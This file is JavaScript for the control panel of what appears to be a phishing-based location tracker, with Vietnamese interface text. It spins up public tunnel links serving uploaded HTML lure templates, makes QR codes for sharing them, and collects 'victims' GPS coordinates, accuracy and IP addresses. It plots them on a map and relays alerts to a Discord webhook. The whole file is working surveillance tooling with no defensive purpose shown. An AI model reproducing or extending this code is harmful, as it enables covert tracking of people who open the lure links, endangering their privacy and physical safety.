// Global state
let map;
let markers = [];

// SSE connection
const evtSource = new EventSource('/stream');
evtSource.onmessage = (e) => {
  const msg = JSON.parse(e.data);
  handleSSE(msg.type, msg.data);
};
evtSource.onerror = () => {
  document.getElementById('connection-status').innerHTML = '🔴 Mất kết nối';
};

function handleSSE(type, data) {
  switch(type) {
    case 'tunnel_created':
      addTunnelRow(data);
      updateStats();
      break;
    case 'tunnel_stopped':
    case 'tunnel_error':
    case 'tunnel_restarted':
      loadTunnels(); // đơn giản là reload bảng
      updateStats();
      break;
    case 'new_gps':
      addVictimRow(data);
      updateMapMarker(data);
      updateStats();
      break;
    case 'webhook_error':
      alert(`Webhook lỗi: ${data.platform}`);
      break;
  }
}

// ================== NAVIGATION ==================
document.querySelectorAll('.nav-item').forEach(item => {
  item.addEventListener('click', () => {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    item.classList.add('active');
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.getElementById(`tab-${item.dataset.tab}`).classList.add('active');
    if (item.dataset.tab === 'victims') initMap();
    if (item.dataset.tab === 'tunnels') loadTunnels();
    if (item.dataset.tab === 'victims') loadVictims();
    if (item.dataset.tab === 'templates') loadTemplates();
  });
});

// ================== TUNNELS ==================
async function createTunnel(quantity = null) {
  const q = quantity || document.getElementById('tunnel-quantity').value || 1;
  const res = await fetch('/api/tunnels', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ quantity: parseInt(q) })
  });
  const json = await res.json();
  if (json.success) {
    loadTunnels();
  } else {
    alert('Lỗi: ' + json.error);
  }
}

async function stopTunnel(id) {
  await fetch(`/api/tunnels/${id}`, { method: 'DELETE' });
  loadTunnels();
}

async function stopAllTunnels() {
  await fetch('/api/tunnels', { method: 'DELETE' });
  loadTunnels();
}

async function loadTunnels() {
  const res = await fetch('/api/tunnels');
  const json = await res.json();
  const tbody = document.querySelector('#tunnels-table tbody');
  tbody.innerHTML = '';
  json.data.forEach(tunnel => {
    const row = tbody.insertRow();
    row.innerHTML = `
      <td>${tunnel.id}</td>
      <td><a href="${tunnel.url}" target="_blank">${tunnel.url || 'N/A'}</a></td>
      <td><span class="status-badge status-${tunnel.status}">${tunnel.status}</span></td>
      <td>${new Date(tunnel.created_at*1000).toLocaleString()}</td>
      <td>
        <button class="btn-secondary" onclick="copyToClipboard('${tunnel.url}')">Copy</button>
        <button class="btn-secondary" onclick="showQR('${tunnel.url}')">QR</button>
        <button class="btn-danger" onclick="stopTunnel(${tunnel.id})">Dừng</button>
      </td>
    `;
  });
}

// ================== VICTIMS ==================
async function loadVictims() {
  const res = await fetch('/api/victims?limit=50');
  const json = await res.json();
  const tbody = document.querySelector('#victims-table tbody');
  tbody.innerHTML = '';
  json.data.forEach(v => {
    const row = tbody.insertRow();
    row.innerHTML = `
      <td>${new Date(v.received_at).toLocaleString()}</td>
      <td>${v.lat?.toFixed(4) || '-'}</td>
      <td>${v.lng?.toFixed(4) || '-'}</td>
      <td>${v.accuracy ? v.accuracy+'m' : '-'}</td>
      <td>${v.ip_address || '-'}</td>
    `;
  });
}

function addVictimRow(v) {
  const tbody = document.querySelector('#victims-table tbody');
  const row = tbody.insertRow(0);
  row.innerHTML = `
    <td>${new Date().toLocaleString()}</td>
    <td>${v.lat?.toFixed(4) || '-'}</td>
    <td>${v.lng?.toFixed(4) || '-'}</td>
    <td>${v.accuracy ? v.accuracy+'m' : '-'}</td>
    <td>${v.ip || '-'}</td>
  `;
}

function initMap() {
  if (!map) {
    map = L.map('map').setView([0, 0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: '&copy; OpenStreetMap'
    }).addTo(map);
  }
}

function updateMapMarker(data) {
  if (!map) initMap();
  const lat = data.lat || data.latitude;
  const lng = data.lng || data.longitude;
  if (lat && lng) {
    const marker = L.marker([lat, lng]).addTo(map);
    markers.push(marker);
    map.setView([lat, lng], 13);
  }
}

// ================== TEMPLATES ==================
async function loadTemplates() {
  const res = await fetch('/api/templates');
  const json = await res.json();
  const container = document.getElementById('template-list');
  container.innerHTML = json.data.map(t => `
    <div class="template-card">
      <strong>${t.title}</strong>
      <span>File: ${t.filename}</span>
      <span>Active: ${t.active ? '✅' : '❌'}</span>
      <button onclick="toggleTemplate(${t.id})">Toggle</button>
    </div>
  `).join('');
}

async function toggleTemplate(id) {
  await fetch(`/api/templates/${id}/toggle`, { method: 'POST' });
  loadTemplates();
}

function uploadTemplate() {
  const input = document.createElement('input');
  input.type = 'file';
  input.accept = '.html';
  input.onchange = async (e) => {
    const file = e.target.files[0];
    const form = new FormData();
    form.append('file', file);
    await fetch('/api/templates/upload', { method: 'POST', body: form });
    loadTemplates();
  };
  input.click();
}

// ================== QR ==================
function showQR(url) {
  fetch('/api/qr', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url })
  }).then(r => r.json()).then(data => {
    document.getElementById('qr-image').src = 'data:image/png;base64,' + data.data;
    document.getElementById('qr-url').textContent = url;
    document.getElementById('qr-modal').style.display = 'flex';
  });
}

function closeModal() {
  document.getElementById('qr-modal').style.display = 'none';
}

function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => alert('Đã copy'));
}

// ================== SETTINGS ==================
document.getElementById('settings-form').addEventListener('submit', async (e) => {
  e.preventDefault();
  const data = {
    discord_webhook: document.getElementById('webhook-url').value,
    max_tunnels: document.getElementById('max-tunnels').value,
    auto_stop_minutes: document.getElementById('auto-stop-minutes').value
  };
  await fetch('/api/settings', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  alert('Đã lưu');
});

// ================== STATS ==================
async function updateStats() {
  const [tunRes, vicRes] = await Promise.all([
    fetch('/api/tunnels'),
    fetch('/api/victims/stats')
  ]);
  const tunnels = (await tunRes.json()).data;
  const vstats = (await vicRes.json()).data;
  document.getElementById('stat-total-tunnels').textContent = tunnels.length;
  document.getElementById('stat-running-tunnels').textContent = tunnels.filter(t => t.status === 'running').length;
  document.getElementById('stat-victims-today').textContent = vstats.today;
  document.getElementById('stat-victims-total').textContent = vstats.total;
}

// Khởi tạo ban đầu
updateStats();
loadTunnels();
loadVictims();
